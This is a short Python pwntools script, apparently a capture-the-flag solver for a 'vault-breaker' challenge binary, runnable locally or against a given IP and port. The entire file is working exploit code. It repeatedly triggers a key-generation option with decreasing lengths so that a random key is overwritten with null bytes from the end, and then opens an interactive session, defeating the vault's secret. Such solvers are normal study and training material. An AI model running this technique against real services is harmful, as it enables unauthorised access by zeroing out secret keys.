#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './vault-breaker' 

os.system('clear')

if len(sys.argv) < 2:
  print('Running solver locally..\n')
  r    = process(fname)
  # r = gdb.debug(fname, gdbscript='break main\ncontinue')
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

# Each loop triggers the "new key genreation" function and overwrites
# random_key to null byte by byte from backwards.
for key_length in range(31, -1, -1):
    r.sendlineafter(b'>', b'1')
    r.sendlineafter(b':', str(key_length).encode())

r.sendlineafter(b'>', b'2')
r.interactive()
